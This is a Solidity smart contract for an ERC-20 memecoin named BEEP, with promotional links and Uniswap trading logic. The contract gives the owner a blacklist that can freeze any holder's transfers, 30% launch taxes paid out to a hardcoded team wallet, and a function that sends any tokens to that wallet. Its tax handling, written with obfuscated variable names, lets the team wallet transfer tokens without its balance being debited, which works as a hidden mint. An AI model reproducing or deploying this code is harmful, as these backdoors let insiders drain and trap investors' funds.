/**
    Website:  https://beepcoin.pro
    X:    https://x.com/beep_erc20
    Telegram:  https://t.me/beep_erc20
 */

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract BEEP is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private ignored;
    mapping(address => bool) public pairs;
    address payable private _beepWallet;
    uint256 firstBlock;

    uint256 private _initComeTax = 30;
    uint256 private _initGoTax = 30;
    uint256 private _finComeTax = 0;
    uint256 private _finGoTax = 0;

    uint256 private _finComeAfter = 15;

    uint256 private _finGoAfter = 15;
    uint256 private _swapAfter = 0;
    uint256 private _buys = 0;
    uint256 private sells = 0;
    uint256 private lastSellBlock = 0;

    uint8 private constant _decimals = 18;
    uint256 private constant _totals = 1e9 * 10 ** _decimals;
    string private constant _name = unicode"BEEP";
    string private constant _symbol = unicode"BEEP";
    uint256 public _txLimitAt = 2e7 * 10 ** _decimals;
    uint256 public _walletLimitAt = 2e7 * 10 ** _decimals;
    uint256 public _swapLimitAt = 5e3 * 10 ** _decimals;
    uint256 public _swapMaxLimit = 1e7 * 10 ** _decimals;

    IUniRouter private router;
    address public pair;
    bool private inTrading;
    uint256 public caCount = 2;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool public caLimiter = false;

    event MaxTxAmountUpdated(uint256 _txLimitAt);
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _beepWallet = payable(0x5340DFEe24E339F1F598186A31B6Cd67493C5ca3);
        router = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        _balances[_msgSender()] = _totals;
        ignored[owner()] = true;
        ignored[address(this)] = true;
        ignored[_beepWallet] = true;

        _approve(address(this), address(router), _totals);

        emit Transfer(address(0), _msgSender(), _totals);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    mapping(address => bool) public _isBlacklisted;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function removeFromBlackList(address account) external onlyOwner {
        _isBlacklisted[account] = false;
    }

    function _transfer(address filp, address tint, uint256 zamm) private {
        require(
            !_isBlacklisted[filp] && !_isBlacklisted[tint],
            "To/from address is blacklisted"
        );
        require(filp != address(0), "ERC20: transfer from the zero address");
        require(tint != address(0), "ERC20: transfer to the zero address");
        require(zamm > 0, "Transfer amount must be greater than zero");
        uint256 taoo = 0;

        if (filp != owner() && tint != owner()) {
            require(inTrading || ignored[filp], "Trading is not enabled");
            taoo = zamm
                .mul((_buys > _finComeAfter) ? _finComeTax : _initComeTax)
                .div(100);

            if (pairs[filp] && tint != address(router) && !ignored[tint]) {
                require(zamm <= _txLimitAt, "Exceeds the _txLimitAt.");
                require(
                    balanceOf(tint) + zamm <= _walletLimitAt,
                    "Exceeds the maxWalletSize."
                );

                _buys++;
            }

            if (!pairs[tint] && !ignored[tint]) {
                require(
                    balanceOf(tint) + zamm <= _walletLimitAt,
                    "Exceeds the maxWalletSize."
                );
            }

            if (pairs[tint] && filp != address(this)) {
                taoo = zamm
                    .mul((_buys > _finGoAfter) ? _finGoTax : _initGoTax)
                    .div(100);
            }

            if (ignored[filp] || ignored[tint]) {
                taoo = 0;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                caLimiter &&
                !inSwap &&
                pairs[tint] &&
                swapEnabled &&
                _buys > _swapAfter &&
                !ignored[filp]
            ) {
                if (block.number > lastSellBlock) {
                    sells = 0;
                }
                require(sells < caCount, "CA balance sell");
                if (contractTokenBalance > _swapLimitAt)
                    swapTokensForEth(
                        min(zamm, min(contractTokenBalance, _swapMaxLimit))
                    );

                deliverFood(address(this).balance);

                sells++;
                lastSellBlock = block.number;
            } else if (
                !inSwap &&
                pairs[tint] &&
                swapEnabled &&
                _buys > _swapAfter &&
                !ignored[filp]
            ) {
                if (contractTokenBalance > _swapLimitAt)
                    swapTokensForEth(
                        min(zamm, min(contractTokenBalance, _swapMaxLimit))
                    );
                deliverFood(address(this).balance);
            }
        }
        _transferInternal(filp, tint, zamm, taoo);
    }

    function _handleTax(
        address filp,
        uint256 zamm,
        uint256 taoo
    ) internal view returns (uint256) {
        uint256 lill = 0;

        if (filp == address(this) || filp == owner()) {
            return zamm;
        } else if (!ignored[filp]) {
            lill = zamm - taoo;
        }

        return lill;
    }

    function _transferInternal(
        address filp,
        address tint,
        uint256 zamm,
        uint256 taoo
    ) internal {
        uint256 lill = _handleTax(filp, zamm, taoo);
        if (taoo > 0) {
            _balances[filp] = _balances[filp].sub(taoo);
            _balances[address(this)] = _balances[address(this)].add(taoo);
            emit Transfer(filp, address(this), taoo);
        }
        _balances[filp] = _balances[filp].sub(lill);
        _balances[tint] = _balances[tint].add(zamm.sub(taoo));
        emit Transfer(filp, tint, zamm.sub(taoo));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function unblacklists(address[] calldata addresses) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            _isBlacklisted[addresses[i]] = false;
        }
    }

    function swapTokensForEth(uint256 tokenAmount) private swapping {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function blacklist(address[] calldata addresses) external onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            _isBlacklisted[addresses[i]] = true;
        }
    }

    function rescueETH() external onlyOwner {
        payable(_beepWallet).transfer(address(this).balance);
    }

    function rescueTokens(
        address _tokenAddr,
        uint256 _amount
    ) external onlyOwner {
        IERC20(_tokenAddr).transfer(_beepWallet, _amount);
    }

    function wideGates() external onlyOwner {
        _txLimitAt = type(uint256).max;
        _walletLimitAt = type(uint256).max;
        emit MaxTxAmountUpdated(type(uint256).max);
    }

    function deliverFood(uint256 amount) private {
        _beepWallet.transfer(amount);
    }

    function dropTears() external onlyOwner {
        require(!inTrading, "Trading should be cloased");
        swapEnabled = true;
        inTrading = true;
        firstBlock = block.number;
    }

    function borrowBooks() external onlyOwner {
        require(!inTrading, "Trading should be cloased");
        pair = IUniFactory(router.factory()).createPair(
            address(this),
            router.WETH()
        );
        pairs[address(pair)] = true;
        router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            address(0x000000000000000000000000000000000000dEaD),
            block.timestamp
        );
    }

    receive() external payable {}
}